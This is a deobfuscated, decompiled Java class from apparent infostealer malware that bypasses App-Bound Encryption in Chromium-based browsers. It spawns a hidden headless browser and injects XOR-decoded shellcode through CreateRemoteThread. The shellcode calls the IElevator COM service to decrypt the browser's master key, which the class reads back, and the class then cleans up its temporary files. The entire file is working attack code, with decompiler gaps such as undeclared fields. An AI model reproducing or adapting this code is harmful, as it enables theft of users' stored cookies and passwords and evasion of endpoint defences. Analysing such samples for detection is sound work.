/*\n * ========================================\n * DEOBFUSCATED: AbeProcessInjector.java\n * Original: c/o.java\n * ----------------------------------------\n * ABE bypass - headless browser a shellcode inject eder, IElevator COM ile key çözer (700 satır)\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.p;
import c.r;
import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.BaseTSD;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.platform.win32.WinReg;
import com.sun.jna.ptr.IntByReference;
import java.io.File;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.FileAttribute;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Map;

final class o {
    private static final String BOOTSTRAP_FUNC = "Bootstrap";
    private static volatile byte[] b;
    private static final String ABE_KEY_NAME = "HBD_ABE_ENC_B64";
    private static final Object processLock;
    private static final int XOR_KEY = 167;

    private o() {
    }

    static boolean hasRunningBrowser(String string) {
        return o.findRunningPidsForKey(o.normalizeKey(string)).length > 0;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    static byte[] retrieveMasterKey(String string, byte[] byArray) throws Exception {
        if (byArray == null || byArray.length == 0) {
            throw new IllegalArgumentException("empty encrypted blob");
        }
        String string2 = o.normalizeKey(string);
        byte[] byArray2 = o.loadPayload();
        int n2 = p.findExportFileOffset(byArray2, a);
        byte[] byArray3 = (byte[])byArray2.clone();
        o.patchImports(byArray3);
        String string3 = Base64.getEncoder().encodeToString(byArray);
        Object object = d;
        synchronized (object) {
            String string4 = System.getenv(c);
            boolean bl = string4 != null;
            try {
                o.setProcessEnv(c, string3);
                Exception exception = null;
                for (int i2 = 0; i2 < 2; ++i2) {
                    byte[] byArray4;
                    try {
                        byte[] byArray5 = o.tryInjectSpawned(string2, byArray3, n2, string3);
                        if (byArray5 == null || byArray5.length != 32) continue;
                        byArray4 = byArray5;
                    }
                    catch (Exception exception2) {
                        exception = exception2;
                        System.err.println("v20: spawn attempt " + (i2 + 1) + " failed for " + string2 + ": " + exception2.getMessage());
                        continue;
                    }
                    return byArray4;
                }
                if (exception != null) {
                    throw exception;
                }
                byte[] byArray6 = null;
                return byArray6;
            }
            finally {
                if (bl) {
                    o.setProcessEnv(c, string4);
                } else {
                    o.setProcessEnv(c, null);
                }
            }
        }
    }

    private static void setProcessEnv(String string, String string2) {
        try {
            Kernel32.INSTANCE.SetEnvironmentVariable(string, string2);
        }
        catch (Throwable throwable) {
            try {
                Field field = System.getenv().getClass().getDeclaredField("m");
                field.setAccessible(true);
                Map map = (Map)field.get(System.getenv());
                if (string2 == null) {
                    map.remove(string);
                } else {
                    map.put(string, string2);
                }
            }
            catch (Throwable throwable2) {
                // empty catch block
            }
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static byte[] tryInjectSpawned(String string, byte[] byArray, int n2, String string2) throws Exception {
        byte[] byArray2;
        Path path;
        block17: {
            Process process;
            block16: {
                String string3 = o.resolveBrowserExe(string);
                path = Files.createTempDirectory("wsvc-", new FileAttribute[0]);
                boolean bl = "edge".equals(string) || "msedge".equals(string);
                process = null;
                WinNT.HANDLE hANDLE = null;
                try {
                    process = o.kickBrowser(string3, path.toAbsolutePath().toString(), string2, bl);
                    long l2 = process.pid();
                    if (l2 <= 0L) {
                        throw new RuntimeException("spawn");
                    }
                    int n3 = (int)l2;
                    Thread.sleep(bl ? 2000L : 1500L);
                    hANDLE = Kernel32.INSTANCE.OpenProcess(1083, false, n3);
                    if (hANDLE == null) {
                        throw new RuntimeException("OpenProcess failed for pid=" + n3 + " err=" + Kernel32.INSTANCE.GetLastError());
                    }
                    byArray2 = o.injectProcess(hANDLE, byArray, n2);
                    if (hANDLE == null) break block16;
                }
                catch (Throwable throwable) {
                    if (hANDLE != null) {
                        try {
                            Kernel32.INSTANCE.TerminateProcess(hANDLE, 0);
                        }
                        catch (Throwable throwable2) {
                            // empty catch block
                        }
                        Kernel32.INSTANCE.CloseHandle(hANDLE);
                    } else if (process != null) {
                        try {
                            process.destroyForcibly();
                        }
                        catch (Throwable throwable3) {
                            // empty catch block
                        }
                    }
                    File file = path.toFile();
                    new Thread(() -> o.lambda$tryInjectSpawned$0(file), "abe-cl").start();
                    throw throwable;
                }
                try {
                    Kernel32.INSTANCE.TerminateProcess(hANDLE, 0);
                }
                catch (Throwable throwable) {
                    // empty catch block
                }
                Kernel32.INSTANCE.CloseHandle(hANDLE);
                break block17;
            }
            if (process != null) {
                try {
                    process.destroyForcibly();
                }
                catch (Throwable throwable) {
                    // empty catch block
                }
            }
        }
        File file = path.toFile();
        new Thread(() -> o.lambda$tryInjectSpawned$0(file), "abe-cl").start();
        return byArray2;
    }

    private static Process kickBrowser(String string, String string2, String string3, boolean bl) throws Exception {
        Process process;
        ArrayList<String> arrayList = new ArrayList<String>();
        arrayList.add(string);
        arrayList.add("--headless=new");
        arrayList.add("--disable-gpu");
        arrayList.add("--no-first-run");
        arrayList.add("--no-default-browser-check");
        arrayList.add("--disable-extensions");
        arrayList.add("--disable-background-networking");
        arrayList.add("--disable-sync");
        arrayList.add("--disable-dev-shm-usage");
        if (bl) {
            arrayList.add("--disable-features=TranslateUI,MediaRouter,msEdgeSidebarV2,EdgeSidebar");
            arrayList.add("--edge-webview-sandbox=false");
        } else {
            arrayList.add("--disable-features=TranslateUI,MediaRouter");
        }
        arrayList.add("--window-position=-32000,-32000");
        arrayList.add("--window-size=1,1");
        arrayList.add("--user-data-dir=" + string2);
        arrayList.add("about:blank");
        ProcessBuilder processBuilder = new ProcessBuilder(arrayList);
        processBuilder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        processBuilder.redirectError(ProcessBuilder.Redirect.DISCARD);
        if (string3 != null) {
            processBuilder.environment().put(c, string3);
        }
        if ((process = processBuilder.start()).pid() <= 0L) {
            process.destroyForcibly();
            throw new RuntimeException("spawn");
        }
        return process;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static byte[] injectProcess(WinNT.HANDLE hANDLE, byte[] byArray, int n2) throws Exception {
        Pointer pointer = Kernel32.INSTANCE.VirtualAllocEx(hANDLE, null, new BaseTSD.SIZE_T((long)byArray.length), 12288, 64);
        if (pointer == null) {
            throw new RuntimeException("VirtualAllocEx failed: " + Kernel32.INSTANCE.GetLastError());
        }
        Memory memory = new Memory(byArray.length);
        memory.write(0L, byArray, 0, byArray.length);
        IntByReference intByReference = new IntByReference();
        if (!Kernel32.INSTANCE.WriteProcessMemory(hANDLE, pointer, memory, byArray.length, intByReference) || intByReference.getValue() != byArray.length) {
            throw new RuntimeException("WriteProcessMemory failed: " + Kernel32.INSTANCE.GetLastError());
        }
        Pointer pointer2 = pointer.share(n2);
        WinNT.HANDLE hANDLE2 = Kernel32.INSTANCE.CreateRemoteThread(hANDLE, null, 0, pointer2, null, 0, null);
        if (hANDLE2 == null) {
            throw new RuntimeException("CreateRemoteThread failed (EDR?): " + Kernel32.INSTANCE.GetLastError());
        }
        try {
            int n3 = Kernel32.INSTANCE.WaitForSingleObject(hANDLE2, 15000);
            if (n3 != 0) {
                throw new RuntimeException("Bootstrap timed out after 15000ms");
            }
            byte[] byArray2 = o.readScratch(hANDLE, pointer);
            return byArray2;
        }
        finally {
            Kernel32.INSTANCE.CloseHandle(hANDLE2);
        }
    }

    private static byte[] readScratch(WinNT.HANDLE hANDLE, Pointer pointer) throws Exception {
        Memory memory = new Memory(12L);
        IntByReference intByReference = new IntByReference();
        Pointer pointer2 = pointer.share(40L);
        if (!Kernel32.INSTANCE.ReadProcessMemory(hANDLE, pointer2, memory, 12, intByReference) || intByReference.getValue() != 12) {
            throw new RuntimeException("ReadProcessMemory header failed");
        }
        byte[] byArray = memory.getByteArray(0L, 12);
        byte by = byArray[1];
        byte by2 = byArray[2];
        int n2 = ByteBuffer.wrap(byArray, 4, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
        int n3 = ByteBuffer.wrap(byArray, 8, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
        if (by != 1) {
            throw new RuntimeException(String.format("ABE failed %s marker=0x%02x err=0x%02x hr=0x%08x com=%d", switch (by2 & 0xFF) {
                case 3 -> "env HBD_ABE_ENC_B64 missing";
                case 2 -> "unknown browser exe (need msedge/chrome COM ids)";
                case 6 -> "CoCreateInstance IElevator failed";
                case 7 -> "IElevator.DecryptData failed";
                default -> "abe_err";
            }, byArray[0] & 0xFF, by2 & 0xFF, n2, n3));
        }
        Memory memory2 = new Memory(32L);
        Pointer pointer3 = pointer.share(64L);
        if (!Kernel32.INSTANCE.ReadProcessMemory(hANDLE, pointer3, memory2, 32, intByReference) || intByReference.getValue() != 32) {
            throw new RuntimeException("ReadProcessMemory key failed");
        }
        return memory2.getByteArray(0L, 32);
    }

    private static void patchImports(byte[] byArray) {
        long l2 = o.funcAddr("kernel32", "LoadLibraryA");
        long l3 = o.funcAddr("kernel32", "GetProcAddress");
        long l4 = o.funcAddr("kernel32", "VirtualAlloc");
        long l5 = o.funcAddr("kernel32", "VirtualProtect");
        long l6 = o.funcAddr("ntdll", "NtFlushInstructionCache");
        if (l2 == 0L || l3 == 0L || l4 == 0L || l5 == 0L || l6 == 0L) {
            throw new IllegalStateException("failed to resolve bootstrap imports");
        }
        p.writeU64(byArray, 64, l2);
        p.writeU64(byArray, 72, l3);
        p.writeU64(byArray, 80, l4);
        p.writeU64(byArray, 88, l5);
        p.writeU64(byArray, 96, l6);
    }

    private static long funcAddr(String string, String string2) {
        try {
            return Pointer.nativeValue(NativeLibrary.getInstance(string).getFunction(string2));
        }
        catch (Throwable throwable) {
            return 0L;
        }
    }

    static String resolveBrowserExe(String string) throws Exception {
        String[] stringArray;
        String[] stringArray2;
        String string2 = o.normalizeKey(string);
        String string3 = o.exeNameFor(string2);
        String string4 = o.resolveHeliumExe();
        if ("helium".equals(string2) && string4 != null) {
            return string4;
        }
        for (String string5 : stringArray2 = new String[]{"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + string3, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + string3}) {
            String string6;
            String exception;
            try {
                exception = Advapi32Util.registryGetStringValue(WinReg.HKEY_LOCAL_MACHINE, string5, "");
                if (exception != null && !exception.isEmpty() && new File(string6 = o.unquotePath(exception)).isFile()) {
                    return new File(string6).getAbsolutePath();
                }
            }
            catch (Exception exception2) {
                // empty catch block
            }
            try {
                exception = Advapi32Util.registryGetStringValue(WinReg.HKEY_CURRENT_USER, string5, "");
                if (exception == null || exception.isEmpty() || !new File(string6 = o.unquotePath(exception)).isFile()) continue;
                return new File(string6).getAbsolutePath();
            }
            catch (Exception exception3) {
                // empty catch block
            }
        }
        String string7 = o.findRunningExe(string3);
        if (string7 != null) {
            File file;
            File stringArray3 = new File(string7);
            File file2 = stringArray3.getParentFile();
            if (file2 != null && o.looksLikeVersionDir(file2.getName()) && (file = new File(file2.getParentFile(), string3)).isFile()) {
                return file.getAbsolutePath();
            }
            return stringArray3.getAbsolutePath();
        }
        for (String string6 : stringArray = o.installFallbacks(string2)) {
            String string8;
            if (string6 == null || string6.isEmpty() || (string8 = o.expandEnv(string6)) == null || !new File(string8).isFile()) continue;
            return new File(string8).getAbsolutePath();
        }
        throw new IllegalStateException("browser executable not found for " + string);
    }

    private static String[] installFallbacks(String string) {
        String string2 = System.getenv("LOCALAPPDATA");
        String string3 = System.getenv("ProgramFiles");
        String string4 = System.getenv("ProgramFiles(x86)");
        String string5 = System.getenv("USERNAME");
        switch (string) {
            case "brave": {
                return new String[]{o.findVersionedExe(string2 + "\\BraveSoftware\\Brave-Browser" /* r.bb() */ + "\\Application" /* r.ap() */, "brave.exe" /* r.bxe() */), string3 + "\\BraveSoftware\\Brave-Browser" /* r.bb() */ + "\\Application" /* r.ap() */ + File.separator + "brave.exe" /* r.bxe() */, string4 + "\\BraveSoftware\\Brave-Browser" /* r.bb() */ + "\\Application" /* r.ap() */ + File.separator + "brave.exe" /* r.bxe() */, string2 + "\\BraveSoftware\\Brave-Browser" /* r.bb() */ + "\\Application" /* r.ap() */ + File.separator + "brave.exe" /* r.bxe() */};
            }
            case "chrome": {
                return new String[]{o.findVersionedExe(string2 + "\\Google\\Chrome" /* r.gc() */ + "\\Application" /* r.ap() */, "chrome.exe" /* r.cxe() */), string3 + "\\Google\\Chrome" /* r.gc() */ + "\\Application" /* r.ap() */ + File.separator + "chrome.exe" /* r.cxe() */, string4 + "\\Google\\Chrome" /* r.gc() */ + "\\Application" /* r.ap() */ + File.separator + "chrome.exe" /* r.cxe() */, string2 + "\\Google\\Chrome" /* r.gc() */ + "\\Application" /* r.ap() */ + File.separator + "chrome.exe" /* r.cxe() */};
            }
            case "edge": 
            case "msedge": {
                return new String[]{string4 + "\\Microsoft\\Edge" /* r.me() */ + "\\Application" /* r.ap() */ + File.separator + "msedge.exe" /* r.mxe() */, string3 + "\\Microsoft\\Edge" /* r.me() */ + "\\Application" /* r.ap() */ + File.separator + "msedge.exe" /* r.mxe() */, o.findVersionedExe(string4 + "\\Microsoft\\Edge" /* r.me() */ + "\\Application" /* r.ap() */, "msedge.exe" /* r.mxe() */), o.findVersionedExe(string3 + "\\Microsoft\\Edge" /* r.me() */ + "\\Application" /* r.ap() */, "msedge.exe" /* r.mxe() */)};
            }
            case "vivaldi": {
                return new String[]{string2 + "\\Vivaldi\\Application\\vivaldi.exe", "C:\\Users\\" + string5 + "\\AppData\\Local\\Vivaldi\\Application\\vivaldi.exe"};
            }
            case "helium": {
                return new String[]{o.resolveHeliumExe()};
            }
        }
        return new String[]{string3 + "\\Google\\Chrome" /* r.gc() */ + "\\Application" /* r.ap() */ + File.separator + "chrome.exe" /* r.cxe() */, string4 + "\\Google\\Chrome" /* r.gc() */ + "\\Application" /* r.ap() */ + File.separator + "chrome.exe" /* r.cxe() */};
    }

    private static String findVersionedExe(String string, String string2) {
        if (string == null || string2 == null) {
            return null;
        }
        File file = new File(string, string2);
        if (file.isFile()) {
            return file.getAbsolutePath();
        }
        File file2 = new File(string);
        if (!file2.isDirectory()) {
            return null;
        }
        File[] fileArray = file2.listFiles(File::isDirectory);
        if (fileArray == null) {
            return null;
        }
        File file3 = null;
        for (File file4 : fileArray) {
            File file5 = new File(file4, string2);
            if (!file5.isFile() || file3 != null && file4.getName().compareTo(file3.getName()) <= 0) continue;
            file3 = file4;
        }
        if (file3 != null) {
            return new File(file3, string2).getAbsolutePath();
        }
        return null;
    }

    private static String expandEnv(String string) {
        if (string == null || string.isEmpty()) {
            return null;
        }
        String string2 = string;
        String string3 = System.getenv("LOCALAPPDATA");
        String string4 = System.getenv("ProgramFiles");
        String string5 = System.getenv("ProgramFiles(x86)");
        if (string3 != null) {
            string2 = string2.replace("%LocalAppData%", string3).replace("%LOCALAPPDATA%", string3);
        }
        if (string4 != null) {
            string2 = string2.replace("%ProgramFiles%", string4);
        }
        if (string5 != null) {
            string2 = string2.replace("%ProgramFiles(x86)%", string5);
        }
        return string2;
    }

    private static String unquotePath(String string) {
        if (string == null) {
            return "";
        }
        return string.replace("\"", "").trim();
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static int[] findRunningPids(String string) {
        if (string == null || string.isEmpty()) {
            return new int[0];
        }
        ArrayList<Integer> arrayList = new ArrayList<Integer>();
        WinNT.HANDLE hANDLE = Kernel32.INSTANCE.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0L));
        if (hANDLE == null || WinNT.INVALID_HANDLE_VALUE.equals(hANDLE)) {
            return new int[0];
        }
        try {
            Tlhelp32.PROCESSENTRY32 pROCESSENTRY32 = new Tlhelp32.PROCESSENTRY32();
            pROCESSENTRY32.dwSize = new WinDef.DWORD((long)pROCESSENTRY32.size());
            if (!Kernel32.INSTANCE.Process32First(hANDLE, pROCESSENTRY32)) {
                int[] nArray = new int[]{};
                return nArray;
            }
            do {
                String string2;
                if (!string.equalsIgnoreCase(string2 = Native.toString(pROCESSENTRY32.szExeFile).trim())) continue;
                arrayList.add(pROCESSENTRY32.th32ProcessID.intValue());
            } while (Kernel32.INSTANCE.Process32Next(hANDLE, pROCESSENTRY32));
        }
        finally {
            Kernel32.INSTANCE.CloseHandle(hANDLE);
        }
        return arrayList.stream().mapToInt(Integer::intValue).toArray();
    }

    private static int[] findRunningPidsForKey(String string) {
        String string2 = o.normalizeKey(string);
        int[] nArray = o.findRunningPids(o.exeNameFor(string2));
        String string3 = o.pathMarkerFor(string2);
        if (string3 == null || nArray.length == 0) {
            return nArray;
        }
        ArrayList<Integer> arrayList = new ArrayList<Integer>();
        for (int n2 : nArray) {
            String string4 = o.queryProcessImagePath(n2);
            if (string4 == null || !string4.toLowerCase().contains(string3.toLowerCase())) continue;
            arrayList.add(n2);
        }
        return arrayList.stream().mapToInt(Integer::intValue).toArray();
    }

    private static String pathMarkerFor(String string) {
        switch (o.normalizeKey(string)) {
            case "helium": {
                return "Helium";
            }
            case "chrome": {
                return "\\Google\\Chrome" /* r.gc() */;
            }
            case "edge": 
            case "msedge": {
                return "\\Microsoft\\Edge" /* r.me() */;
            }
        }
        return null;
    }

    private static boolean looksLikeVersionDir(String string) {
        if (string == null || string.isEmpty()) {
            return false;
        }
        int n2 = 0;
        boolean bl = false;
        for (int i2 = 0; i2 < string.length(); ++i2) {
            char c2 = string.charAt(i2);
            if (c2 == '.') {
                ++n2;
                continue;
            }
            if (c2 >= '0' && c2 <= '9') {
                bl = true;
                continue;
            }
            return false;
        }
        return bl && n2 >= 1;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static String queryProcessImagePath(int n2) {
        WinNT.HANDLE hANDLE = Kernel32.INSTANCE.OpenProcess(4096, false, n2);
        if (hANDLE == null) {
            return null;
        }
        try {
            char[] cArray = new char[32768];
            IntByReference intByReference = new IntByReference(cArray.length);
            if (Kernel32.INSTANCE.QueryFullProcessImageName(hANDLE, 0, cArray, intByReference)) {
                String string = new String(cArray, 0, intByReference.getValue()).trim();
                return string;
            }
        }
        finally {
            Kernel32.INSTANCE.CloseHandle(hANDLE);
        }
        return null;
    }

    private static String findRunningExe(String string) {
        int[] nArray = o.findRunningPids(string);
        if (nArray.length == 0) {
            return null;
        }
        for (int n2 : nArray) {
            String string2 = o.queryProcessImagePath(n2);
            if (string2 == null || !new File(string2).isFile()) continue;
            return string2;
        }
        return null;
    }

    private static String resolveHeliumExe() {
        String string = System.getenv("LOCALAPPDATA");
        if (string == null || string.isEmpty()) {
            return null;
        }
        File file = new File(string, "imput\\Helium\\Application");
        File file2 = new File(file, "chrome.exe");
        if (file2.isFile()) {
            return file2.getAbsolutePath();
        }
        File[] fileArray = file.listFiles(File::isDirectory);
        if (fileArray != null) {
            for (File file3 : fileArray) {
                File file4 = new File(file3, "chrome.exe");
                if (!file4.isFile()) continue;
                return file4.getAbsolutePath();
            }
        }
        return null;
    }

    private static String exeNameFor(String string) {
        switch (o.normalizeKey(string)) {
            case "edge": 
            case "msedge": {
                return "msedge.exe";
            }
            case "brave": {
                return "brave.exe";
            }
            case "vivaldi": {
                return "vivaldi.exe";
            }
            case "opera": {
                return "opera.exe";
            }
        }
        return "chrome.exe";
    }

    static String normalizeKey(String string) {
        if (string == null) {
            return "chrome";
        }
        String string2 = string.toLowerCase();
        if (string2.contains("edge")) {
            return "edge";
        }
        if (string2.contains("brave")) {
            return "brave";
        }
        if (string2.contains("vivaldi")) {
            return "vivaldi";
        }
        if (string2.contains("opera")) {
            return "opera";
        }
        if (string2.contains("yandex")) {
            return "yandex";
        }
        if (string2.contains("helium")) {
            return "helium";
        }
        return "chrome";
    }

    private static byte[] decodePayload(byte[] byArray) {
        byte[] byArray2 = new byte[byArray.length];
        for (int i2 = 0; i2 < byArray.length; ++i2) {
            byArray2[i2] = (byte)(byArray[i2] ^ 0xA7);
        }
        return byArray2;
    }

    private static byte[] loadPayload() throws Exception {
        Object object;
        if (b != null) {
            return b;
        }
        String[] stringArray = new String[]{"/abe/core.dat", "/abe/abe_extractor_amd64.bin", "/abe_extractor_amd64.bin"};
        Object[] objectArray = stringArray;
        int n2 = objectArray.length;
        for (int i2 = 0; i2 < n2; ++i2) {
            String string = objectArray[i2];
            Object object2 = o.class.getResourceAsStream(string);
            if (object2 == null && (object = Thread.currentThread().getContextClassLoader()) != null) {
                object2 = ((ClassLoader)object).getResourceAsStream(string.startsWith("/") ? string.substring(1) : string);
            }
            if (object2 == null) continue;
            object = object2;
            try {
                byte[] byArray = ((InputStream)object).readAllBytes();
                byte[] byArray2 = b = string.contains("core.dat") ? o.decodePayload(byArray) : byArray;
                return byArray2;
            }
            finally {
                if (object != null) {
                    ((InputStream)object).close();
                }
            }
        }
        for (Object object2 : objectArray = new File[]{new File("abe/core.dat"), new File("abe/abe_extractor_amd64.bin"), new File("abe_extractor_amd64.bin")}) {
            if (!((File)object2).isFile()) continue;
            object = Files.readAllBytes(((File)object2).toPath());
            b = (byte[])(((File)object2).getName().equals("core.dat") ? (Object)o.decodePayload((byte[])object) : object);
            return b;
        }
        throw new IllegalStateException("abe payload not found in JAR or disk");
    }

    private static void deleteRecursive(File file) {
        File[] fileArray;
        if (file == null || !file.exists()) {
            return;
        }
        if (file.isDirectory() && (fileArray = file.listFiles()) != null) {
            for (File file2 : fileArray) {
                o.deleteRecursive(file2);
            }
        }
        file.delete();
    }

    private static void lambda$tryInjectSpawned$0(File file) {
        try {
            Thread.sleep(1500L);
            o.deleteRecursive(file);
        }
        catch (Throwable throwable) {
            // empty catch block
        }
    }

    static {
        d = new Object();
    }
}

